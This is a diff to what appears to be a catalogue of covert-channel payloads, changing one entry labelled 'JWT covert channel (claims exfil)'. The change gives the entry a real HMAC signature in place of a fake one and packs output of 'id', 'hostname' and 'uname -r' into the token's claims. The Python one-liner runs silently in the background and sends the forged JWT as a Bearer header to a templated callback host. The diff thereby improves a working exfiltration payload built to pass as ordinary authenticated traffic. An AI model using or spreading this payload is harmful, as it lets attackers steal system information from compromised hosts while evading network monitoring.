@@ -136,13 +136,16 @@ s.close()
       id:"http_jwt_channel", name:"JWT covert channel (claims exfil)", category:"Stealth-HTTP",
       protocol:"https", os:"linux", stealth:5,
       command:`python3 -c "
-import base64,json,urllib.request,os
-def mkjwt(payload):
-  hdr=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).decode().rstrip('=')
-  bod=base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
-  return f'{hdr}.{bod}.fake_sig'
-data={'sub':'user','exp':9999999999,'jti':'${token}','ctx':os.popen('id&&whoami').read()[:100]}
-tok=mkjwt(data)
+import base64,json,urllib.request,os,hmac,hashlib
+_K='${token}'.encode()
+def _b64(b):return base64.urlsafe_b64encode(b).decode().rstrip('=')
+def mkjwt(payload,key):
+  h=_b64(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
+  b=_b64(json.dumps(payload).encode())
+  sig=_b64(hmac.new(key,f'{h}.{b}'.encode(),hashlib.sha256).digest())
+  return f'{h}.{b}.{sig}'
+data={'sub':'user','iat':__import__('time').time(),'exp':__import__('time').time()+3600,'jti':'${token}','ctx':os.popen('id&&hostname&&uname -r').read()[:120]}
+tok=mkjwt(data,_K)
 req=urllib.request.Request('${cbUrl}/${token}',headers={'Authorization':f'Bearer {tok}','User-Agent':'${ua(0)}'})
 urllib.request.urlopen(req,timeout=5)
 " 2>/dev/null &`,
